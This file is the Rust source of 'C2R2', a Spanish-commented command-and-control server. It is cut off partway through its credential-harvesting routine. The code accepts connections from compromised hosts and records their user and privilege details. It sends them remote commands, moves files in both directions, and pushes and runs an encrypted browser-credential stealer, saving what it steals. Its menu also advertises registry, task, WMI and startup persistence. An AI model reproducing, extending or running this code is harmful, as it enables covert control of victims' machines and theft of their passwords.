use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::mpsc;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicU64, Ordering};
use std::path::{Path, PathBuf};
use std::env;
use clap::Parser;
use chrono::Local;
use colored::*;
use prettytable::{Table, Row, Cell, format};
use std::fs;
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;
use tracing::{info, warn, error, debug};
use tracing_subscriber::EnvFilter;
use tracing_appender::rolling::{RollingFileAppender, Rotation};

type ClientId = u64;

const DELIMITER: &str = "\n<<END>>\n";

#[derive(Parser)]
#[command(name = "c2r2-server")]
#[command(about = "C2R2 Command & Control Server", long_about = None)]
struct Args {
    /// Dirección IP donde bindear (0.0.0.0 para todas las interfaces)
    #[arg(short, long, default_value = "0.0.0.0")]
    bind: String,

    /// Puerto donde escuchar conexiones
    #[arg(short, long, default_value_t = 4444)]
    port: u16,
    
    /// Modo verboso
    #[arg(short, long)]
    verbose: bool,
}

// Información del cliente
#[derive(Clone)]
struct ClientInfo {
    id: ClientId,
    addr: String,
    hostname: Option<String>,
    username: Option<String>,
    os_version: Option<String>,
    privileges: Option<String>,
    connected_at: String,
}

impl ClientInfo {
    fn new(id: ClientId, addr: String) -> Self {
        Self {
            id,
            addr,
            hostname: None,
            username: None,
            os_version: None,
            privileges: None,
            connected_at: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        }
    }
}

// Estructura para manejar cada cliente
struct ClientHandle {
    id: ClientId,
    info: Arc<Mutex<ClientInfo>>,
    tx: mpsc::UnboundedSender<String>,
}

/// Obtiene la ruta al directorio modules/
/// Busca en:
/// 1. ./modules/ (si ejecutas desde c2r2-server/)
/// 2. ./c2r2-server/modules/ (si ejecutas desde raíz)
/// 3. <exe_dir>/modules/ (si ejecutas el binario)
fn get_modules_path() -> PathBuf {
    // Opción 1: modules/ en directorio actual
    let path1 = PathBuf::from("modules");
    if path1.exists() {
        return path1;
    }
    
    // Opción 2: c2r2-server/modules/ desde raíz
    let path2 = PathBuf::from("c2r2-server/modules");
    if path2.exists() {
        return path2;
    }
    
    // Opción 3: modules/ relativo al ejecutable
    if let Ok(exe) = env::current_exe() {
        if let Some(exe_dir) = exe.parent() {
            let path3 = exe_dir.join("modules");
            if path3.exists() {
                return path3;
            }
        }
    }
    
    // Fallback: modules/ en directorio actual (aunque no exista)
    PathBuf::from("modules")
}

// Maneja la comunicación con un cliente
async fn handle_client(
    id: ClientId,
    stream: TcpStream,
    clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
    verbose: bool,
) {
    let addr = stream.peer_addr().unwrap().to_string();
    info!("Nueva conexión: [{}] desde {}", id, addr);
    println!("{} {} {} {}", 
        "🔗".bright_green(), 
        "Nuevo cliente".bright_white().bold(),
        format!("[{}]", id).bright_cyan().bold(),
        format!("desde {}", addr).bright_white().dimmed()
    );

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    let client_info = Arc::new(Mutex::new(ClientInfo::new(id, addr.clone())));
    
    {
        let mut clients = clients.lock().unwrap();
        clients.insert(id, ClientHandle {
            id,
            info: client_info.clone(),
            tx,
        });
    }

    let (reader, mut writer) = stream.into_split();
    let mut reader = BufReader::new(reader);

    // Tarea para enviar comandos al cliente (sin keep-alive ping)
    let send_task = tokio::spawn(async move {
        loop {
            // Esperar comandos del canal
            match rx.recv().await {
                Some(cmd) => {
                    let message = format!("{}\n", cmd);
                    if let Err(e) = writer.write_all(message.as_bytes()).await {
                        if verbose {
                            eprintln!("{} Error enviando a [{}]: {}", "❌".bright_red(), id, e);
                        }
                        break;
                    }
                    if let Err(e) = writer.flush().await {
                        if verbose {
                            eprintln!("{} Error flush [{}]: {}", "❌".bright_red(), id, e);
                        }
                        break;
                    }
                }
                None => break, // Canal cerrado
            }
        }
    });

    // Tarea para recibir respuestas del cliente
    let info = client_info.clone();
    let recv_task = tokio::spawn(async move {
        let mut command_buffer = String::new();
        
        loop {
            let mut line = String::new();
            match reader.read_line(&mut line).await {
                Ok(0) => {
                    if verbose {
                        println!("{} Cliente {} desconectado", "🔌".bright_red(), format!("[{}]", id).bright_cyan());
                    }
                    return;
                }
                Ok(_) => {
                    // Si es sysinfo, procesar inmediatamente
                    if line.starts_with("__SYSINFO__:") {
                        // Formato: __SYSINFO__:tipo:valor
                        let parts: Vec<&str> = line.trim().splitn(3, ':').collect();
                        if parts.len() >= 3 {
                            let mut info = info.lock().unwrap();
                            match parts[1] {
                                "hostname" => {
                                    info.hostname = Some(parts[2].to_string());
                                    info!("[{}] SYSINFO hostname: {}", id, parts[2]);
                                    if verbose {
                                        println!("{} {} hostname: {}", 
                                            "📝".bright_green(), 
                                            format!("[{}]", id).bright_cyan(),
                                            parts[2].bright_white()
                                        );
                                    }
                                }
                                "username" => {
                                    info.username = Some(parts[2].to_string());
                                    info!("[{}] SYSINFO username: {}", id, parts[2]);
                                    if verbose {
                                        println!("{} {} username: {}", 
                                            "📝".bright_green(), 
                                            format!("[{}]", id).bright_cyan(),
                                            parts[2].bright_white()
                                        );
                                    }
                                }
                                "os" => {
                                    info.os_version = Some(parts[2].to_string());
                                    info!("[{}] SYSINFO OS: {}", id, parts[2]);
                                    if verbose {
                                        println!("{} {} OS: {}", 
                                            "📝".bright_green(), 
                                            format!("[{}]", id).bright_cyan(),
                                            parts[2].bright_white()
                                        );
                                    }
                                }
                                "privileges" => {
                                    info.privileges = Some(parts[2].to_string());
                                    info!("[{}] SYSINFO privileges: {}", id, parts[2]);
                                    if verbose {
                                        let priv_colored = if parts[2] == "Admin" {
                                            parts[2].bright_red().bold()
                                        } else {
                                            parts[2].bright_yellow().bold()
                                        };
                                        println!("{} {} privilegios: {}", 
                                            "📝".bright_green(), 
                                            format!("[{}]", id).bright_cyan(),
                                            priv_colored
                                        );
                                    }
                                }
                                _ => {}
                            }
                        }
                        continue;
                    }
                    
                    // Para comandos, acumular hasta encontrar delimitador
                    command_buffer.push_str(&line);
                    if command_buffer.contains(DELIMITER) {
                        let response = command_buffer.replace(DELIMITER, "").trim().to_string();
                        if !response.is_empty() {
                            // Verificar si es una respuesta de file transfer
                            if response.starts_with("__FILE__:") {
                                info!("[{}] Recibiendo archivo descargado", id);
                                handle_file_download(&response, id, verbose);
                            } else if response.starts_with("__CREDENTIALS_B64__:") {
                                // Respuesta de /harvest con credenciales en Base64
                                let encoded = response.strip_prefix("__CREDENTIALS_B64__:").unwrap_or("");
                                info!("[{}] Recibiendo credenciales robadas (Base64)", id);
                                handle_credentials_harvest(encoded, id);
                            } else if response.starts_with("__ERROR__:") {
                                let error = response.strip_prefix("__ERROR__:").unwrap_or(&response);
                                error!("[{}] Error recibido: {}", id, error);
                                println!();
                                println!("{} {} {}", 
                                    "❌".bright_red(), 
                                    "Error de".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", error.bright_red());
                                println!("{}", "─".repeat(60).bright_black());
                                println!();
                            } else if response.starts_with("__SUCCESS__:") {
                                let msg = response.strip_prefix("__SUCCESS__:").unwrap_or(&response);
                                info!("[{}] Éxito: {}", id, msg);
                                println!();
                                println!("{} {} {}", 
                                    "✅".bright_green(), 
                                    "Éxito de".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", msg.bright_green());
                                println!("{}", "─".repeat(60).bright_black());
                                println!();
                            } else {
                                // Respuesta normal de comando - LOGUEAR OUTPUT COMPLETO
                                info!("[{}] OUTPUT:\n{}", id, response);
                                debug!("[{}] Respuesta recibida: {} bytes", id, response.len());
                                println!();
                                println!("{} {} {}", 
                                    "📨".bright_blue(), 
                                    "Respuesta de".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", response);
                                println!("{}", "─".repeat(60).bright_black());
                                println!();
                            }
                        }
                        command_buffer.clear();
                    }
                }
                Err(e) => {
                    if verbose {
                        eprintln!("{} Error leyendo [{}]: {}", "⚠️ ".bright_yellow(), id, e);
                    }
                    return;
                }
            }
        }
    });

    // Esperar a que termine alguna tarea
    tokio::select! {
        _ = send_task => {},
        _ = recv_task => {},
    }

    // Limpiar cliente
    clients.lock().unwrap().remove(&id);
    warn!("Cliente [{}] desconectado", id);
    println!("❌ Cliente [{}] desconectado", id);
}

fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
    // Formato: __FILE__:nombre_archivo:tamaño:datos_base64
    let parts: Vec<&str> = response.splitn(4, ':').collect();
    
    if parts.len() != 4 {
        error!("[{}] Formato de archivo inválido en descarga", client_id);
        eprintln!("{} Formato de archivo inválido", "❌".bright_red());
        return;
    }
    
    let file_name = parts[1];
    let file_size = parts[2];
    let encoded_data = parts[3];
    
    if verbose {
        println!("{} Decodificando {} bytes de base64...", "🔄".bright_yellow(), encoded_data.len());
    }
    
    match base64_decode(encoded_data) {
        Ok(file_data) => {
            let save_path = format!("downloads/{}", file_name);
            
            // Crear directorio downloads si no existe
            if let Err(e) = fs::create_dir_all("downloads") {
                error!("[{}] Error creando directorio downloads: {}", client_id, e);
                eprintln!("{} Error creando directorio downloads: {}", "❌".bright_red(), e);
                return;
            }
            
            match fs::write(&save_path, file_data) {
                Ok(_) => {
                    info!("[{}] Archivo descargado: {} ({} bytes) -> {}", client_id, file_name, file_size, save_path);
                    println!();
                    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
                    println!("{}", format!("║              📥 ARCHIVO DESCARGADO [{}]", client_id).bright_green().bold());
                    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
                    println!();
                    println!("  {} {}", "📄 Archivo:".bright_cyan().bold(), file_name.bright_white());
                    println!("  {} {}", "📊 Tamaño:".bright_cyan().bold(), format!("{} bytes", file_size).bright_white());
                    println!("  {} {}", "💾 Guardado:".bright_cyan().bold(), save_path.bright_white());
                    println!();
                }
                Err(e) => {
                    error!("[{}] Error guardando archivo '{}': {}", client_id, save_path, e);
                    eprintln!("{} Error guardando archivo: {}", "❌".bright_red(), e);
                }
            }
        }
        Err(e) => {
            error!("[{}] Error decodificando base64: {}", client_id, e);
            eprintln!("{} Error decodificando base64: {}", "❌".bright_red(), e);
        }
    }
}

/// Maneja la recepción de credenciales robadas en Base64
fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
    // Decodificar Base64
    match base64_decode(encoded_data) {
        Ok(decoded_bytes) => {
            // Convertir bytes a string UTF-8
            match String::from_utf8(decoded_bytes) {
                Ok(credentials_text) => {
                    // Crear directorio harvested si no existe
                    if let Err(e) = fs::create_dir_all("harvested") {
                        error!("[{}] Error creando directorio harvested: {}", client_id, e);
                        eprintln!("{} Error creando directorio harvested: {}", "❌".bright_red(), e);
                        return;
                    }
                    
                    // Nombre del archivo con timestamp
                    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
                    let filename = format!("harvested/credentials_{}_{}.txt", client_id, timestamp);
                    
                    // Guardar archivo
                    match fs::write(&filename, &credentials_text) {
                        Ok(_) => {
                            info!("[{}] Credenciales guardadas en: {}", client_id, filename);
                            
                            // Mostrar en consola con formato bonito
                            println!();
                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
                            println!("{}", format!("║         🔑 CREDENCIALES OBTENIDAS [{}]", client_id).bright_green().bold());
                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
                            println!();
                            
                            // Contar credenciales (líneas que contienen "Browser:")
                            let cred_count = credentials_text.lines()
                                .filter(|line| line.trim().starts_with("Browser:"))
                                .count();
                            
                            println!("  {} {}", "📊 Total:".bright_cyan().bold(), format!("{} credenciales", cred_count).bright_white());
                            println!("  {} {}", "💾 Guardado:".bright_cyan().bold(), filename.bright_white());
                            println!("  {} {}", "📄 Tamaño:".bright_cyan().bold(), format!("{} bytes", credentials_text.len()).bright_white());
                            println!();
                            println!("{}", "─".repeat(60).bright_black());
                            println!("{}", credentials_text.bright_white());
                            println!("{}", "─".repeat(60).bright_black());
                            println!();
                        }
                        Err(e) => {
                            error!("[{}] Error guardando credenciales: {}", client_id, e);
                            eprintln!("{} Error guardando credenciales: {}", "❌".bright_red(), e);
                        }
                    }
                }
                Err(e) => {
                    error!("[{}] Error convirtiendo credenciales a UTF-8: {}", client_id, e);
                    eprintln!("{} Datos decodificados no son UTF-8 válido: {}", "❌".bright_red(), e);
                }
            }
        }
        Err(e) => {
            error!("[{}] Error decodificando Base64: {}", client_id, e);
            eprintln!("{} Error decodificando Base64: {}", "❌".bright_red(), e);
        }
    }
}

fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
    let data = data.trim();
    let mut result = Vec::new();
    
    let decode_char = |c: char| -> Result<u8, String> {
        match c {
            'A'..='Z' => Ok(c as u8 - b'A'),
            'a'..='z' => Ok(c as u8 - b'a' + 26),
            '0'..='9' => Ok(c as u8 - b'0' + 52),
            '+' => Ok(62),
            '/' => Ok(63),
            '=' => Ok(0),
            _ => Err(format!("Carácter inválido en base64: {}", c)),
        }
    };
    
    let chars: Vec<char> = data.chars().collect();
    for chunk in chars.chunks(4) {
        if chunk.len() != 4 {
            continue;
        }
        
        let b1 = decode_char(chunk[0])?;
        let b2 = decode_char(chunk[1])?;
        let b3 = decode_char(chunk[2])?;
        let b4 = decode_char(chunk[3])?;
        
        result.push((b1 << 2) | (b2 >> 4));
        if chunk[2] != '=' {
            result.push((b2 << 4) | (b3 >> 2));
        }
        if chunk[3] != '=' {
            result.push((b3 << 6) | b4);
        }
    }
    
    Ok(result)
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    
    for chunk in data.chunks(3) {
        let mut buf = [0u8; 3];
        for (i, &byte) in chunk.iter().enumerate() {
            buf[i] = byte;
        }
        
        let b1 = (buf[0] >> 2) & 0x3F;
        let b2 = ((buf[0] & 0x03) << 4) | ((buf[1] >> 4) & 0x0F);
        let b3 = ((buf[1] & 0x0F) << 2) | ((buf[2] >> 6) & 0x03);
        let b4 = buf[2] & 0x3F;
        
        result.push(CHARS[b1 as usize] as char);
        result.push(CHARS[b2 as usize] as char);
        result.push(if chunk.len() > 1 { CHARS[b3 as usize] as char } else { '=' });
        result.push(if chunk.len() > 2 { CHARS[b4 as usize] as char } else { '=' });
    }
    
    result
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    // Configurar el logger con archivos rotativos diarios
    let logs_dir = "logs";
    std::fs::create_dir_all(logs_dir).expect("No se pudo crear el directorio de logs");
    
    // Archivo rotativo diario para logs completos
    let file_appender = RollingFileAppender::new(
        Rotation::DAILY,
        logs_dir,
        "c2r2-session.log"
    );
    
    // IMPORTANTE: Mantener el guard vivo durante toda la ejecución
    let (non_blocking, guard) = tracing_appender::non_blocking(file_appender);
    
    tracing_subscriber::fmt()
        .with_writer(non_blocking)
        .with_env_filter(
            EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| EnvFilter::new("info"))
        )
        .with_ansi(false)  // Sin colores en archivos
        .with_target(false)
        .with_thread_ids(false)
        .with_file(false)
        .with_line_number(false)
        .with_level(true)
        .init();
    
    info!("╔══════════════════════════════════════════════════════════════╗");
    info!("║          C2R2 Server v2.0 - Session Started                ║");
    info!("║          Listening: {}:{:<43}║", args.bind, args.port);
    info!("╚══════════════════════════════════════════════════════════════╝");
    info!("");

    // Banner con colores (solo en consola)
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
    println!("{}", "║          C2R2 - Command & Control Server v2.0            ║".bright_cyan());
    println!("{}", "║              Direct Connection - No Shellcode            ║".bright_cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
    println!();
    println!("{} {}", "🌐 Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.port).bright_white());
    println!("{} {}", "📝 Help:".bright_yellow().bold(), "/help".bright_white());
    println!("{} {}", "📂 Logs:".bright_yellow().bold(), format!("{}/", logs_dir).bright_white());
    if args.verbose {
        println!("{}", "🔍 Verbose Mode: ON".bright_magenta());
    }
    println!();

    let listener = TcpListener::bind(format!("{}:{}", args.bind, args.port))
        .await
        .expect("No se pudo iniciar el servidor");

    let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
    let next_id = Arc::new(AtomicU64::new(1));
    let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));

    // Tarea para aceptar conexiones
    let clients_clone = clients.clone();
    let next_id_clone = next_id.clone();
    let verbose = args.verbose;
    tokio::spawn(async move {
        loop {
            match listener.accept().await {
                Ok((stream, _)) => {
                    let id = next_id_clone.fetch_add(1, Ordering::SeqCst);
                    let clients = clients_clone.clone();
                    tokio::spawn(handle_client(id, stream, clients, verbose));
                }
                Err(e) => {
                    eprintln!("{} {}", "❌ Error:".bright_red().bold(), e);
                }
            }
        }
    });

    // Loop para comandos del usuario con rustyline
    let mut rl = DefaultEditor::new().expect("No se pudo inicializar rustyline");
    
    // Intentar cargar historial
    let history_file = ".c2r2_history";
    let _ = rl.load_history(history_file);

    loop {
        // Mostrar prompt con cliente seleccionado
        let selected = *selected_client.lock().unwrap();
        let prompt = if let Some(id) = selected {
            format!("{} ", format!("C2R2[{}]>", id).bright_green().bold())
        } else {
            format!("{} ", "C2R2>".bright_blue().bold())
        };

        match rl.readline(&prompt) {
            Ok(line) => {
                // Agregar al historial
                let _ = rl.add_history_entry(line.as_str());
                
                let parts: Vec<&str> = line.trim().split_whitespace().collect();
                
                if parts.is_empty() {
                    continue;
                }

            match parts[0] {
                "/help" => {
                    println!();
                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
                    println!("{}", "                    📖 COMANDOS DISPONIBLES".bright_cyan().bold());
                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
                    println!();
                    println!("  {} {:<20} {}", "📋".bright_yellow(), "/list", "Lista todos los clientes conectados con info".bright_white());
                    println!("  {} {:<20} {}", "🎯".bright_green(), "/select <id>", "Selecciona un cliente por ID".bright_white());
                    println!("  {} {:<20} {}", "📤".bright_blue(), "/cmd <comando>", "Envía comando al cliente seleccionado".bright_white());
                    println!("  {} {:<20} {}", "📡".bright_magenta(), "/cmd_all <cmd>", "Envía comando a TODOS los clientes".bright_white());
                    println!("  {} {:<20} {}", "📥".bright_cyan(), "/download <ruta>", "Descarga archivo desde el cliente".bright_white());
                    println!("  {} {:<20} {}", "📤".bright_green(), "/upload <local> <remoto>", "Sube archivo al cliente".bright_white());
                    println!("  {} {:<20} {}", "🔑".bright_red(), "/harvest", "Roba credenciales de browsers (Chrome, Edge, Firefox, etc.)".bright_white());
                    println!("  {} {:<20} {}", "📌".bright_magenta(), "/persist <method>", "Establece persistencia (registry|task|wmi|startup)".bright_white());
                    println!("  {} {:<20} {}", "🧹".bright_yellow(), "/persist_remove", "Remueve persistencia del cliente".bright_white());
                    println!("  {} {:<20} {}", "📡".bright_blue(), "/beacon <int:jit>", "Configura intervalo beacon (ej: 60:30 = 60s ±30%)".bright_white());
                    println!("  {} {:<20} {}", "ℹ️ ".bright_cyan(), "/info <id>", "Muestra info detallada de un cliente".bright_white());
                    println!("  {} {:<20} {}", "🔄".bright_yellow(), "/deselect", "Deselecciona el cliente actual".bright_white());
                    println!("  {} {:<20} {}", "👋".bright_red(), "/exit, /quit", "Cierra el servidor".bright_white());
                    println!("  {} {:<20} {}", "❓".bright_cyan(), "/help", "Muestra este menú".bright_white());
                    println!();
                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
                    println!();
                }
                "/list" => {
                    let clients = clients.lock().unwrap();
                    if clients.is_empty() {
                        println!("{}", "⚠️  No hay clientes conectados".bright_yellow());
                    } else {
                        println!();
                        let mut table = Table::new();
                        table.set_format(*format::consts::FORMAT_BOX_CHARS);
                        
                        // Header con colores
                        table.add_row(Row::new(vec![
                            Cell::new("ID").style_spec("Fb"),
                            Cell::new("Dirección").style_spec("Fb"),
                            Cell::new("Hostname").style_spec("Fb"),
                            Cell::new("Usuario").style_spec("Fb"),
                            Cell::new("OS").style_spec("Fb"),
                            Cell::new("Privilegios").style_spec("Fb"),
                            Cell::new("Conectado").style_spec("Fb"),
                        ]));
                        
                        for (id, client) in clients.iter() {
                            let info = client.info.lock().unwrap();
                            let priv_color = if info.privileges.as_deref() == Some("Admin") { "Fr" } else { "Fy" };
                            
                            table.add_row(Row::new(vec![
                                Cell::new(&id.to_string()).style_spec("Fc"),
                                Cell::new(&info.addr),
                                Cell::new(info.hostname.as_deref().unwrap_or("...")),
                                Cell::new(info.username.as_deref().unwrap_or("...")),
                                Cell::new(info.os_version.as_deref().unwrap_or("...")),
                                Cell::new(info.privileges.as_deref().unwrap_or("...")).style_spec(priv_color),
                                Cell::new(&info.connected_at).style_spec("Fd"),
                            ]));
                        }
                        
                        println!("{}", format!("📋 {} cliente(s) conectado(s)", clients.len()).bright_green().bold());
                        table.printstd();
                        println!();
                    }
                }
                "/info" => {
                    if parts.len() < 2 {
                        println!("{} /info <id>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    if let Ok(id) = parts[1].parse::<ClientId>() {
                        let clients = clients.lock().unwrap();
                        if let Some(client) = clients.get(&id) {
                            let info = client.info.lock().unwrap();
                            println!();
                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
                            println!("{}", format!("║              INFORMACIÓN DEL CLIENTE [{}]                ║", id).bright_cyan().bold());
                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
                            println!();
                            println!("  {} {}", "🆔 ID:".bright_green().bold(), id.to_string().bright_white());
                            println!("  {} {}", "🌐 Dirección:".bright_green().bold(), info.addr.bright_white());
                            println!("  {} {}", "💻 Hostname:".bright_green().bold(), info.hostname.as_deref().unwrap_or("N/A").bright_white());
                            println!("  {} {}", "👤 Usuario:".bright_green().bold(), info.username.as_deref().unwrap_or("N/A").bright_white());
                            println!("  {} {}", "🖥️  OS:".bright_green().bold(), info.os_version.as_deref().unwrap_or("N/A").bright_white());
                            
                            let priv_str = info.privileges.as_deref().unwrap_or("N/A");
                            let priv_colored = if priv_str == "Admin" { 
                                priv_str.bright_red().bold() 
                            } else { 
                                priv_str.bright_yellow().bold() 
                            };
                            println!("  {} {}", "🔑 Privilegios:".bright_green().bold(), priv_colored);
                            println!("  {} {}", "⏰ Conectado:".bright_green().bold(), info.connected_at.bright_white());
                            println!();
                        } else {
                            println!("{} Cliente {} no encontrado", "❌".bright_red(), id);
                        }
                    } else {
                        println!("{} ID inválido", "❌".bright_red());
                    }
                }
                "/select" => {
                    if parts.len() < 2 {
                        println!("{} /select <id>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    if let Ok(id) = parts[1].parse::<ClientId>() {
                        let clients = clients.lock().unwrap();
                        if clients.contains_key(&id) {
                            *selected_client.lock().unwrap() = Some(id);
                            println!("{} {}", "✅ Cliente".bright_green(), format!("[{}]", id).bright_cyan().bold());
                            println!("{}", "   Usa /cmd <comando> para enviar comandos".bright_white().dimmed());
                        } else {
                            println!("{} Cliente {} no encontrado", "❌".bright_red(), id);
                        }
                    } else {
                        println!("{} ID inválido", "❌".bright_red());
                    }
                }
                "/deselect" => {
                    *selected_client.lock().unwrap() = None;
                    println!("{}", "✅ Cliente deseleccionado".bright_green());
                }
                "/download" => {
                    if parts.len() < 2 {
                        println!("{} /download <ruta_remota>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    let remote_path = parts[1..].join(" ").trim_matches('"').to_string(); // Remove quotes
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            let command = format!("__DOWNLOAD__:{}", remote_path);
                            info!("[{}] Comando /download: {}", id, remote_path);
                            if let Err(e) = client.tx.send(command) {
                                error!("[{}] Error enviando comando download: {}", id, e);
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                            } else {
                                println!("{} Solicitando descarga de: {}", 
                                    "📥".bright_cyan(), 
                                    remote_path.bright_white()
                                );
                            }
                        } else {
                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/upload" => {
                    if parts.len() < 3 {
                        println!("{} /upload <archivo_local> <ruta_remota>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    let local_path = parts[1].trim_matches('"'); // Remove quotes
                    let remote_path = parts[2..].join(" ").trim_matches('"').to_string(); // Remove quotes and join
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        // Verificar si el path remoto es un directorio (termina en \)
                        let final_remote_path = if remote_path.ends_with('\\') || remote_path.ends_with('/') {
                            // Si es directorio, agregar el nombre del archivo local
                            let filename = std::path::Path::new(local_path)
                                .file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("uploaded_file");
                            format!("{}{}", remote_path, filename)
                        } else {
                            remote_path
                        };
                        
                        // Leer archivo local
                        match fs::read(local_path) {
                            Ok(file_data) => {
                                let encoded = base64_encode(&file_data);
                                let command = format!("__UPLOAD__|{}|{}", final_remote_path, encoded);
                                
                                info!("[{}] Comando /upload: {} -> {} ({} bytes)", id, local_path, final_remote_path, file_data.len());
                                
                                let clients = clients.lock().unwrap();
                                if let Some(client) = clients.get(&id) {
                                    if let Err(e) = client.tx.send(command) {
                                        error!("[{}] Error enviando comando upload: {}", id, e);
                                        println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                    } else {
                                        println!();
                                        println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
                                        println!("{}", format!("║              📤 SUBIENDO ARCHIVO [{}]", id).bright_cyan().bold());
                                        println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
                                        println!();
                                        println!("  {} {}", "📄 Local:".bright_green().bold(), local_path.bright_white());
                                        println!("  {} {}", "🎯 Remoto:".bright_green().bold(), final_remote_path.bright_white());
                                        println!("  {} {}", "📊 Tamaño:".bright_green().bold(), format!("{} bytes", file_data.len()).bright_white());
                                        println!();
                                    }
                                } else {
                                    println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                    *selected_client.lock().unwrap() = None;
                                }
                            }
                            Err(e) => {
                                error!("[{}] Error leyendo archivo local '{}': {}", id, local_path, e);
                                println!("{} Error leyendo archivo local '{}': {}", "❌".bright_red(), local_path, e);
                            }
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/harvest" => {
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            info!("[{}] Comando /harvest: Robando credenciales de browsers", id);
                            
                            // Verificar que existan los archivos del módulo
                            let modules_dir = get_modules_path();
                            let stealer_enc_path = modules_dir.join("stealer.enc");
                            let stealer_key_path = modules_dir.join("stealer.key");
                            
                            if !stealer_enc_path.exists() {
                                println!("{}", "❌ Error: stealer.enc no encontrado".bright_red());
                                println!("   Ruta buscada: {}", stealer_enc_path.display());
                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
                                continue;
                            }
                            
                            if !stealer_key_path.exists() {
                                println!("{}", "❌ Error: stealer.key no encontrado".bright_red());
                                println!("   Ruta buscada: {}", stealer_key_path.display());
                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
                                continue;
                            }
                            
                            // Leer archivos
                            let dll_data = match fs::read(stealer_enc_path) {
                                Ok(data) => data,
                                Err(e) => {
                                    println!("{} Error leyendo stealer.enc: {}", "❌".bright_red(), e);
                                    continue;
                                }
                            };
                            
                            let key_data = match fs::read(stealer_key_path) {
                                Ok(data) => data,
                                Err(e) => {
                                    println!("{} Error leyendo stealer.key: {}", "❌".bright_red(), e);
                                    continue;
                                }
                            };
                            
                            println!();
                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
                            println!("{}", format!("║           🔑 HARVESTING CREDENTIALS [{}]", id).bright_red().bold());
                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
                            println!();
                            println!("{}", "  📤 Subiendo stealer.enc...".bright_yellow());
                            
                            // Subir DLL encriptada
                            let encoded_dll = base64_encode(&dll_data);
                            let upload_dll_cmd = format!("__UPLOAD__|stealer.enc|{}", encoded_dll);
                            if let Err(e) = client.tx.send(upload_dll_cmd) {
                                error!("[{}] Error enviando stealer.enc: {}", id, e);
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                continue;
                            }
                            
                            // Esperar un poco para que se suba
                            std::thread::sleep(std::time::Duration::from_millis(200));
                            
                            println!("{}", "  � Subiendo stealer.key...".bright_yellow());
                            
                            // Subir clave
                            let encoded_key = base64_encode(&key_data);
                            let upload_key_cmd = format!("__UPLOAD__|stealer.key|{}", encoded_key);
                            if let Err(e) = client.tx.send(upload_key_cmd) {
                                error!("[{}] Error enviando stealer.key: {}", id, e);
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                continue;
                            }
                            
                            // Esperar un poco
                            std::thread::sleep(std::time::Duration::from_millis(200));
                            
                            println!("{}", "  🚀 Ejecutando stealer...".bright_yellow());
                            println!("{}", "  🎯 Chrome, Edge, Firefox, Brave, Opera".bright_white().dimmed());
                            println!("{}", "  ⏳ Esperando credenciales...".bright_white().dimmed());
                            println!();
                            
